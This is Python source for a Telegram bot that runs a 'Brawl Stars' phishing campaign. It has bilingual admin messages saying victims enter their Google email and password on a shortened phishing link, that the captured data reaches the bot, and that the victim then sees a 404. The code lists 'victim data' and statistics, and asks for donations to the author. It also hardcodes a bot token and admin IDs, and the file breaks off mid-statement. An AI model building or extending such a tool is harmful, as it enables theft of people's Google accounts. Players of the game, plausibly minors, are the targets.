import requests
import time
import json
from datetime import datetime

BOT_TOKEN = "8601549576:AAHLJF0oPN6Sx6jQRpfuHz-Stl3Fri_6LxI"
ADMIN_ID = 8744429026
ADMIN_USERNAME = "NeresVoid"
PHISHING_URL = "https://da.gd/tzO5QW"

last_update_id = 0
victims = []
user_language = {}
tickets = {}
admin_reply_context = {}

# ========== ТЕКСТЫ ==========
TEXTS = {
    'ru': {
        'start_user': "🎉 **Добро пожаловать!** 🎉\n\n🔹 Используй кнопки ниже для связи с администратором.\n🔹 По всем вопросам создавай тикет — ответят в ближайшее время.",
        'start_admin': "🎉 **BRAWL STARS FISHING** 🎉\n\n🔗 **Фишинг-ссылка:**\n`{url}`\n\n👨‍💼 **Поймано жертв:** {count}\n\n📌 Отправь ссылку жертве — данные придут сюда.",
        'instruction': "📖 **ИНСТРУКЦИЯ**\n\n1️⃣ Отправь ссылку жертве\n2️⃣ Жертва вводит почту и пароль Google\n3️⃣ Данные приходят сюда\n4️⃣ Жертва видит ошибку 404\n\n⚠️ Ссылка всегда одна: {url}",
        'data_empty': "📭 **Нет данных**\n\nПока нет ни одной жертвы.",
        'data_title': "👥 **Последние 5 жертв:**\n\n",
        'stats': "📊 **СТАТИСТИКА**\n\n👨‍💼 Всего жертв: {total}\n🌐 Уникальных IP: {unique}",
        'donate': "✨ **ПОДДЕРЖАТЬ АВТОРА** ✨\n\nВыбери сумму доната:",
        'donate_25': "✨ **ПОДДЕРЖАТЬ АВТОРА** ✨\n\nНажми на кнопку ниже, чтобы отправить **25 Telegram Stars**.\n\n⭐ 25 звёзд ≈ 50 рублей\n\nСпасибо за поддержку! 💙",
        'donate_50': "✨ **ПОДДЕРЖАТЬ АВТОРА** ✨\n\nНажми на кнопку ниже, чтобы отправить **50 Telegram Stars**.\n\n⭐ 50 звёзд ≈ 100 рублей\n\nСпасибо за поддержку! 💙",
        'donate_100': "✨ **ПОДДЕРЖАТЬ АВТОРА** ✨\n\nНажми на кнопку ниже, чтобы отправить **100 Telegram Stars**.\n\n⭐ 100 звёзд ≈ 200 рублей\n\nСпасибо за поддержку! 💙",
        'ticket_created': "✅ **Тикет создан!**\n\nНапиши свой вопрос ниже. Администратор ответит в этом чате.\n\n⚠️ У тебя активен один тикет. Чтобы создать новый, закрой текущий командой /close.",
        'ticket_already_active': "❌ **У тебя уже есть активный тикет!**\n\nДождись ответа администратора или закрой старый тикет командой /close.",
        'ticket_closed': "✅ **Тикет закрыт!**\n\nЕсли остались вопросы — создай новый тикет кнопкой ниже.",
        'no_active_ticket': "❌ У тебя нет активных тикетов.\n\nНажми «Поддержка», чтобы создать.",
        'ticket_not_found': "❌ Тикет не найден или уже закрыт.",
        'reply_from_admin': "📩 **Ответ от администратора:**\n\n{text}",
        'user_message': "📩 **Сообщение от пользователя**\n\n👤 ID: `{user_id}`\n👤 Username: @{username}\n💬 Сообщение:\n`{text}`\n━━━━━━━━━━━━━━━\n📌 Тикет #{ticket_id}",
        'closed_ticket_notify': "🔒 Пользователь @{username} закрыл тикет #{ticket_id}",
        'reply_sent': "✅ Ответ отправлен пользователю @{username}",
        'admin_reply_instruction': "✏️ **Ответ пользователю @{username}**\n\nНапиши текст ответа ниже:",
        'no_reply_context': "❌ У вас нет активного диалога с пользователем.",
        'message_received': "✅ Сообщение получено.",
        'language_changed': "✅ Язык: Русский",
        'language_changed_en': "✅ Language: English",
        'settings': "⚙️ **НАСТРОЙКИ**\n\nВыбери язык:",
        'support_text': "📩 **Поддержка**\n\nНажми кнопку ниже, чтобы создать тикет. Администратор ответит в этом чате.",
        'close_command': "❌ У вас нет активного диалога с пользователем.",
        'new_message_to_admin': "✅ Сообщение отправлено администратору. Ответ придёт сюда.",
        'btn_data': "📋 Данные жертв",
        'btn_stats': "📊 Статистика",
        'btn_donate': "⭐ Поддержать автора",
        'btn_instruction': "📖 Инструкция",
        'btn_settings': "⚙️ Настройки",
        'btn_back': "🔙 Назад",
        'btn_support': "📩 Поддержка",
        'btn_close': "❌ Закрыть тикет",
        'btn_reply': "✏️ Ответить",
        'btn_lang_ru': "🇷🇺 Русский",
        'btn_lang_en': "🇬🇧 English",
        'btn_donate_25': "⭐ 25 звёзд",
        'btn_donate_50': "⭐ 50 звёзд",
        'btn_donate_100': "⭐ 100 звёзд"
    },
    'en': {
        'start_user': "🎉 **Welcome!** 🎉\n\n🔹 Use buttons below to contact admin.\n🔹 For any questions, create a ticket — you'll get a reply soon.",
        'start_admin': "🎉 **BRAWL STARS FISHING** 🎉\n\n🔗 **Phishing link:**\n`{url}`\n\n👨‍💼 **Victims caught:** {count}\n\n📌 Send the link to victim — data will come here.",
        'instruction': "📖 **INSTRUCTION**\n\n1️⃣ Send link to victim\n2️⃣ Victim enters Google email and password\n3️⃣ Data comes here\n4️⃣ Victim sees 404 error\n\n⚠️ Link is always the same: {url}",
        'data_empty': "📭 **No data**\n\nNo victims yet.",
        'data_title': "👥 **Last 5 victims:**\n\n",
        'stats': "📊 **STATISTICS**\n\n👨‍💼 Total victims: {total}\n🌐 Unique IPs: {unique}",
        'donate': "✨ **SUPPORT THE AUTHOR** ✨\n\nChoose donation amount:",
        'donate_25': "✨ **SUPPORT THE AUTHOR** ✨\n\nClick the button below to send **25 Telegram Stars**.\n\n⭐ 25 stars ≈ $0.5\n\nThank you for your support! 💙",
        'donate_50': "✨ **SUPPORT THE AUTHOR** ✨\n\nClick the button below to send **50 Telegram Stars**.\n\n⭐ 50 stars ≈ $1\n\nThank you for your support! 💙",
        'donate_100': "✨ **SUPPORT THE AUTHOR** ✨\n\nClick the button below to send **100 Telegram Stars**.\n\n⭐ 100 stars ≈ $2\n\nThank you for your support! 💙",
        'ticket_created': "✅ **Ticket created!**\n\nWrite your question below. Admin will answer in this chat.\n\n⚠️ You have one active ticket. To create a new one, close the current one with /close.",
        'ticket_already_active': "❌ **You already have an active ticket!**\n\nWait for admin response or close old ticket with /close.",
        'ticket_closed': "✅ **Ticket closed!**\n\nIf you have more questions — create a new ticket using the button below.",
        'no_active_ticket': "❌ You have no active tickets.\n\nPress 'Support' to create one.",
        'ticket_not_found': "❌ Ticket not found or already closed.",
        'reply_from_admin': "📩 **Reply from admin:**\n\n{text}",
        'user_message': "📩 **Message from user**\n\n👤 ID: `{user_id}`\n👤 Username: @{username}\n💬 Message:\n`{text}`\n━━━━━━━━━━━━━━━\n📌 Ticket #{ticket_id}",
        'closed_ticket_notify': "🔒 User @{username} closed ticket #{ticket_id}",
        'reply_sent': "✅ Reply sent to user @{username}",
        'admin_reply_instruction': "✏️ **Reply to user @{username}**\n\nWrite your reply below:",
        'no_reply_context': "❌ You have no active reply context.",
        'message_received': "✅ Message received.",
        'language_changed': "✅ Language: English",
        'language_changed_ru': "✅ Язык: Русский",
        'settings': "⚙️ **SETTINGS**\n\nChoose language:",
        'support_text': "📩 **Support**\n\nPress the button below to create a ticket. Admin will answer in this chat.",
        'close_command': "❌ You have no active dialog with user.",
        'new_message_to_admin': "✅ Message sent to admin. Reply will come here.",
        'btn_data': "📋 Victim data",
        'btn_stats': "📊 Statistics",
        'btn_donate': "⭐ Support author",
        'btn_instruction': "📖 Instruction",
        'btn_settings': "⚙️ Settings",
        'btn_back': "🔙 Back",
        'btn_support': "📩 Support",
        'btn_close': "❌ Close ticket",
        'btn_reply': "✏️ Reply",
        'btn_lang_ru': "🇷🇺 Русский",
        'btn_lang_en': "🇬🇧 English",
        'btn_donate_25': "⭐ 25 stars",
        'btn_donate_50': "⭐ 50 stars",
        'btn_donate_100': "⭐ 100 stars"
    }
}

def get_text(chat_id, key, **kwargs):
    lang = user_language.get(chat_id, 'ru')
    text = TEXTS[lang].get(key, TEXTS['ru'][key])
    return text.format(**kwargs) if kwargs else text

def get_button_text(chat_id, key):
    lang = user_language.get(chat_id, 'ru')
    return TEXTS[lang].get(key, TEXTS['ru'][key])

def send_message(chat_id, text, keyboard=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    if keyboard:
        data["reply_markup"] = json.dumps({"inline_keyboard": keyboard})
    try:
        requests.post(url, json=data)
    except Exception as e:
        print(f"Ошибка отправки: {e}")

def edit_message(chat_id, message_id, text, keyboard=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
    data = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": "Markdown"}
    if keyboard:
        data["reply_markup"] = json.dumps({"inline_keyboard": keyboard})
    try:
        requests.post(url, json=data)
    except Exception as e:
        print(f"Ошибка редактирования: {e}")

def answer_callback(callback_id, text="", show_alert=False):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
    data = {"callback_query_id": callback_id, "text": text, "show_alert": show_alert}
    try:
        requests.post(url, json=data)
    except Exception as e:
        print(f"Ошибка ответа: {e}")

def get_main_keyboard(chat_id):
    if chat_id == ADMIN_ID:
        return [
            [{"text": get_button_text(chat_id, 'btn_data'), "callback_data": "data"}, {"text": get_button_text(chat_id, 'btn_stats'), "callback_data": "stats"}],
            [{"text": get_button_text(chat_id, 'btn_donate'), "callback_data": "donate"}],
            [{"text": get_button_text(chat_id, 'btn_instruction'), "callback_data": "instruction"}, {"text": get_button_text(chat_id, 'btn_settings'), "callback_data": "settings"}]
        ]
    else:
        return [
            [{"text": get_button_text(chat_id, 'btn_support'), "callback_data": "create_ticket"}],
            [{"text": get_button_text(chat_id, 'btn_instruction'), "callback_data": "instruction"}, {"text": get_button_text(chat_id, 'btn_settings'), "callback_data": "settings"}]
        ]

def get_back_keyboard(chat_id):
    return [[{"text": get_button_text(chat_id, 'btn_back'), "callback_data": "back"}]]

def get_language_keyboard(chat_id):
    return [
        [{"text": get_button_text(chat_id, 'btn_lang_ru'), "callback_data": "lang_ru"}, {"text": get_button_text(chat_id, 'btn_lang_en'), "callback_data": "lang_en"}],
        [{"text": get_button_text(chat_id, 'btn_back'), "callback_data": "back"}]
    ]

def get_donate_keyboard(chat_id):
    return [
        [{"text": get_button_text(chat_id, 'btn_donate_25'), "callback_data": "donate_25"}],
        [{"text": get_button_text(chat_id, 'btn_donate_50'), "callback_data": "donate_50"}],
        [{"text": get_button_text(chat_id, 'btn_donate_100'), "callback_data": "donate_100"}],
        [{"text": get_button_text(chat_id, 'btn_back'), "callback_data": "back"}]
    ]

def get_ticket_keyboard(chat_id, ticket_id):
    return [[{"text": get_button_text(chat_id, 'btn_close'), "callback_data": f"close_ticket_{ticket_id}"}]]

def get_victims_keyboard(chat_id, victims_list):
    keyboard = []
    for i, v in enumerate(victims_list[:5]):
        victim_id = len(victims) - i - 1  # уникальный ID для callback
        keyboard.append([{"text": f"📧 {v['email'][:20]}...", "callback_data": f"victim_{victim_id}"}])
    keyboard.append([{"text": get_button_text(chat_id, 'btn_back'), "callback_data": "back"}])
    return keyboard

def get_admin_reply_keyboard(user_id, username, ticket_id):
    return [[{"text": get_button_text(ADMIN_ID, 'btn_reply'), "callback_data": f"admin_reply_{user_id}_{username}_{ticket_id}"}]]

def generate_ticket_id():
    return int(time.time()) % 1000000

def create_ticket(user_id, username):
    ticket_id = generate_ticket_id()
    tickets[user_id] = {
        "active": True,
        "ticket_id": ticket_id,
        "username": username,
        "messages": [],
        "created_at": time.time()
    }
    return ticket_id

def close_ticket(user_id):
    if user_id in tickets and tickets[user_id]["active"]:
        tickets[user_id]["active"] = False
        return True
    return False

def get_active_ticket(user_id):
    if user_id in tickets and tickets[user_id]["active"]:
        return tickets[user_id]
    return None

print("✅ Бот запущен на Railway!")
print(f"🔗 Ссылка: {PHISHING_URL}")
print(f"👑 Администратор: @{ADMIN_USERNAME}")

while True:
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={last_update_id + 1}&timeout=10"
        response = requests.get(url).json()

        for update in response.get("result", []):
            last_update_id = update["update_id"]
            message = update.get("message", {})
            callback = update.get("callback_query", {})

            # Обработка сообщений
            if message:
                chat_id = message.get("chat", {}).get("id")
                username = message.get("chat", {}).get("username", "нет")
                text = message.get("text", "")
                
                if chat_id == ADMIN_ID:
                    if text == "/start":
                        send_message(chat_id, get_text(chat_id, 'start_admin', url=PHISHING_URL, count=len(victims)), get_main_keyboard(chat_id))
                    
                    elif chat_id in admin_reply_context and admin_reply_context[chat_id].get("waiting_reply"):
                        target_user_id = admin_reply_context[chat_id]["user_id"]
                        target_username = admin_reply_context[chat_id]["username"]
                        ticket_id = admin_reply_context[chat_id].get("ticket_id")
                        
                        send_message(target_user_id, get_text(target_user_id, 'reply_from_admin', text=text))
                        send_message(chat_id, get_text(chat_id, 'reply_sent', username=target_username))
                        
                        if target_user_id in tickets and tickets[target_user_id]["active"]:
                            tickets[target_user_id]["messages"].append({"role": "admin", "text": text, "time": time.time()})
                        
                        admin_reply_context[chat_id] = {}
                    
                    elif text == "/close":
                        send_message(chat_id, get_text(chat_id, 'close_command'))
                    
                    else:
                        send_message(chat_id, get_text(chat_id, 'message_received'))
                
                else:
                    if text == "/start":
                        send_message(chat_id, get_text(chat_id, 'start_user'), get_main_keyboard(chat_id))
                    
                    elif text == "/close":
                        if close_ticket(chat_id):
                            send_message(chat_id, get_text(chat_id, 'ticket_closed'), get_main_keyboard(chat_id))
                            if ADMIN_ID in admin_reply_context and admin_reply_context[ADMIN_ID].get("user_id") == chat_id:
                                admin_reply_context[ADMIN_ID] = {}
                            ticket_info = tickets.get(chat_id, {})
                            send_message(ADMIN_ID, get_text(ADMIN_ID, 'closed_ticket_notify', username=username, ticket_id=ticket_info.get('ticket_id', '?')))
                        else:
                            send_message(chat_id, get_text(chat_id, 'no_active_ticket'), get_main_keyboard(chat_id))
                    
                    else:
                        active_ticket = get_active_ticket(chat_id)
                        if active_ticket:
                            active_ticket["messages"].append({"role": "user", "text": text, "time": time.time()})
                            
                            forward_text = get_text(ADMIN_ID, 'user_message', user_id=chat_id, username=username, text=text, ticket_id=active_ticket["ticket_id"])
                            reply_keyboard = get_admin_reply_keyboard(chat_id, username, active_ticket["ticket_id"])
                            send_message(ADMIN_ID, forward_text, reply_keyboard)
                            
                            send_message(chat_id, get_text(chat_id, 'new_message_to_admin'))
                        else:
                            send_message(chat_id, get_text(chat_id, 'no_active_ticket'), get_main_keyboard(chat_id))

            # Обработка нажатий на кнопки
            if callback:
                chat_id = callback.get("from", {}).get("id")
                data = callback.get("data")
                callback_id = callback.get("id")
                message_id = callback.get("message", {}).get("message_id")
                username = callback.get("from", {}).get("username", "нет")

                if data == "create_ticket":
                    active_ticket = get_active_ticket(chat_id)
                    if active_ticket:
                        edit_message(chat_id, message_id, get_text(chat_id, 'ticket_already_active'), get_back_keyboard(chat_id))
                    else:
                        ticket_id = create_ticket(chat_id, username)
                        edit_message(chat_id, message_id, get_text(chat_id, 'ticket_created'), get_ticket_keyboard(chat_id, ticket_id))
                    answer_callback(callback_id)

                elif data.startswith("close_ticket_"):
                    ticket_id = int(data.split("_")[2])
                    if close_ticket(chat_id):
                        edit_message(chat_id, message_id, get_text(chat_id, 'ticket_closed'), get_main_keyboard(chat_id))
                        if ADMIN_ID in admin_reply_context and admin_reply_context[ADMIN_ID].get("user_id") == chat_id:
                            admin_reply_context[ADMIN_ID] = {}
                        send_message(ADMIN_ID, get_text(ADMIN_ID, 'closed_ticket_notify', username=username, ticket_id=ticket_id))
                    else:
                        edit_message(chat_id, message_id, get_text(chat_id, 'ticket_not_found'), get_back_keyboard(chat_id))
                    answer_callback(callback_id)

                elif data.startswith("admin_reply_"):
                    parts = data.split("_")
                    if len(parts) >= 5:
                        target_user_id = int(parts[2])
                        target_username = parts[3]
                        ticket_id = int(parts[4])
                        admin_reply_context[chat_id] = {"waiting_reply": True, "user_id": target_user_id, "username": target_username, "ticket_id": ticket_id}
                        send_message(chat_id, get_text(chat_id, 'admin_reply_instruction', username=target_username))
                        answer_callback(callback_id)

                elif data == "back":
                    if chat_id == ADMIN_ID:
                        edit_message(chat_id, message_id, get_text(chat_id, 'start_admin', url=PHISHING_URL, count=len(victims)), get_main_keyboard(chat_id))
                    else:
                        edit_message(chat_id, message_id, get_text(chat_id, 'start_user'), get_main_keyboard(chat_id))
                    answer_callback(callback_id)

                elif data == "donate":
                    edit_message(chat_id, message_id, get_text(chat_id, 'donate'), get_donate_keyboard(chat_id))
                    answer_callback(callback_id)

                elif data == "donate_25":
                    donate_link = "https://t.me/telegram?start=star25"
                    keyboard = [[{"text": get_button_text(chat_id, 'btn_donate_25'), "url": donate_link}]]
                    edit_message(chat_id, message_id, get_text(chat_id, 'donate_25'), keyboard)
                    answer_callback(callback_id)

                elif data == "donate_50":
                    donate_link = "https://t.me/telegram?start=star50"
                    keyboard = [[{"text": get_button_text(chat_id, 'btn_donate_50'), "url": donate_link}]]
                    edit_message(chat_id, message_id, get_text(chat_id, 'donate_50'), keyboard)
                    answer_callback(callback_id)

                elif data == "donate_100":
                    donate_link = "https://t.me/telegram?start=star100"
                    keyboard 
